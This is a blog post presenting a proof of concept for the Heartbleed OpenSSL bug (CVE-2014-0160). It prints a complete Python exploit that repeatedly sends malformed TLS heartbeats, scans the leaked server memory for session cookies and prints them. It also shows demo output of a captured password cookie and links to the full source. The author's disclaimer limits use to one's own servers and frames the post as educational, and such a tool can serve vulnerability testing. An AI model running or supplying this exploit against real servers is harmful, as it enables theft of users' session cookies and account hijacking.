---
layout: post
title: PoC to capture data via the Heartbleed Bug
description: "A simple proof of concept on how to capture data on server running OpenSSL! April 8"
tags: [heartbeat bug, hacking, exploitation]
comments: true
---

This code is not mine nor I claim credits for it. You should use it only on your servers. It is very much against the law if you execute it on servers that you do not own. This code is for educational purposes only. I take no responsibility for you doing something stupid with it. Use it to check if your Apache servers running OpenSSL are vulnerable.

This is in regards to the bug that was found in OpenSSL versions 1.0.1 to 1.0.1f. These versions do not properly handle hearbeat extension. More info can be read here, [CVE-2014-0160](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160).

### Testing Ubuntu 12.04.3 LTS running OpenSSL 1.0.1

{% highlight c %}
$ python heartbleed-altered.py 192.168.199.135 secure
secure
securepassword=iamencrypted
{% endhighlight %}

The command above will try to capture section of a memory on the server running a vulnerable OpenSSL version. This is not even a mitm attack. This tool is directly connected to the Apache server via SSL(https).

> I noticed though sometimes, it doesn't capture anything. I'm pretty sure that the full working code is not being shared which I think is appropriate.

The output shows it was able to capture the securepassword cookie. I would like to emphasize that this is totally different from sniffing.

On my browser, I visited https://192.168.199.135/index.php
{% highlight c %}
<?php
    session_start();
    setcookie("securepassword", "iamencrypted");
    setcookie("secureusername", "highlysecured");
?>
{% endhighlight %}

This is how it looks in Chrome Developer Tools
<figure>
    <a href="/images/cookie-on-chrome-dev-tools.png"><img src="/images/cookie-on-chrome-dev-tools.png"></a>
</figure>

Below is an output using a different tool

> It was able to capture most of the cookie variables. A different browser was used this time.

<figure>
    <a href="/images/heartbleed-captures.png"><img src="/images/heartbleed-captures.png"></a>
</figure>

[Full-source code can be downloaded here](https://gist.github.com/c0debreaker/10225656)

{% highlight c %}
#!/usr/bin/python

# Connects to servers vulnerable to CVE-2014-0160 and looks for cookies, specifically user sessions.
# Michael Davis (mike.philip.davis@gmail.com)

# Based almost entirely on the quick and dirty demonstration of CVE-2014-0160 by Jared Stafford (jspenguin@jspenguin.org)

# The author disclaims copyright to this source code.

import select
import sys
import string
import struct
import socket
import time
from optparse import OptionParser

options = OptionParser(usage='%prog server [options]', description='Test for SSL heartbeat vulnerability (CVE-2014-0160)')
options.add_option('-p', '--port', type='int', default=443, help='TCP port to test (default: 443)')
options.add_option('-c', '--cookie', type='str', default='session', help='Cookie to look for. (default: session)')


def h2bin(x):
    return x.replace(' ', '').replace('\n', '').decode('hex')

hello = h2bin('''
16 03 02 00  dc 01 00 00 d8 03 02 53
43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c
c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09
c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44
c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c
c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04
03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19
00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
00 0f 00 01 01
''')

hb = h2bin('''
18 03 02 00 03
01 40 00
''')


class HeartBleeder(object):

    server_response = None
    socket = None
    hostname = ''
    port = 443
    found_sessions = set()
    cookie = 'session'
    cookie_length = 56

    def __init__(self, hostname='', cookie=''):
        self.hostname = hostname
        self.cookie = cookie

    def connect(self):
        """
        Connects to the remote server.
        """
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sys.stdout.flush()
        self.socket.connect((self.hostname, self.port))
        sys.stdout.flush()
        self.socket.send(hello)
        sys.stdout.flush()

    def rcv_response(self):
        while True:
            _type, version, payload = self.rcv_message()
            if _type is None:
                print 'Server closed connection without sending Server Hello.'
                return
            # Look for server hello done message.
            if _type == 22 and ord(payload[0]) == 0x0E:
                break

    def rcv_message(self):

        record_header = self.rcv_all(5)
        if record_header is None:
            print 'Unexpected EOF receiving record header - server closed connection'
            return None, None, None
        _type, version, line = struct.unpack('>BHH', record_header)
        payload = self.rcv_all(line, 10)
        if payload is None:
            print 'Unexpected EOF receiving record payload - server closed connection'
            return None, None, None
        # print ' ... received message: type = %d, ver = %04x, length = %d' % (typ, ver, len(pay))
        return _type, version, payload

    def rcv_all(self, length, timeout=5):
        endtime = time.time() + timeout
        rdata = ''
        remain = length
        while remain > 0:
            rtime = endtime - time.time()
            if rtime < 0:
                return None
            r, w, e = select.select([self.socket], [], [], 5)
            if self.socket in r:
                data = self.socket.recv(remain)
                # EOF?
                if not data:
                    return None
                rdata += data
                remain -= len(data)
        return rdata

    def try_heartbeat(self):
        self.socket.send(hb)
        while True:
            _type, version, self.payload = self.rcv_message()
            if _type is None:
                print 'No heartbeat response received, server likely not vulnerable'
                return False

            if _type == 24:
                # print 'Received heartbeat response:'
                self.parse_response()
                if len(self.payload) > 3:
                    pass
                    # print 'WARNING: server returned more data than it should - server is vulnerable!'
                else:
                    print 'Server processed malformed heartbeat, but did not return any extra data.'
                return True

            if _type == 21:
                print 'Received alert:'
                self.hexdump(self.payload)
                print 'Server returned error, likely not vulnerable'
                return False

    def parse_response(self):
        """
        Parses the response from the server for a session id.
        """
        ascii = ''.join((c if 32 <= ord(c) <= 126 else ' ')for c in self.payload)
        index = string.find(ascii, self.cookie)
        if index >= 0:
            info = ascii[index:index + self.cookie_length]
            session = info.split(' ')[0]
            session = string.replace(session, ';', '')
            if session not in self.found_sessions:
                self.found_sessions.add(session)
                print session

    def hexdump(self, payload):
        """
        Prints out a hexdump in the event that server returns an error.
        """
        for b in xrange(0, len(payload), 16):
            line = [c for c in payload[b:b + 16]]
            hxdat = ' '.join('%02X' % ord(c) for c in line)
            pdat = ''.join((c if 32 <= ord(c) <= 126 else '.')for c in line)
            print '  %04x: %-48s %s' % (b, hxdat, pdat)
        print

    def scan(self):
        self.connect()
        self.rcv_response()
        self.try_heartbeat()


def main():
    opts, args = options.parse_args()
    if len(args) < 1:
        options.print_help()
        return

    cookies_str = 'session'
    if len(args) > 1:
        cookies_str = args[1]

    print cookies_str

    while True:
        heartbeat = HeartBleeder(hostname=args[0], cookie=cookies_str)
        heartbeat.scan()


if __name__ == '__main__':
    main()
{% endhighlight %}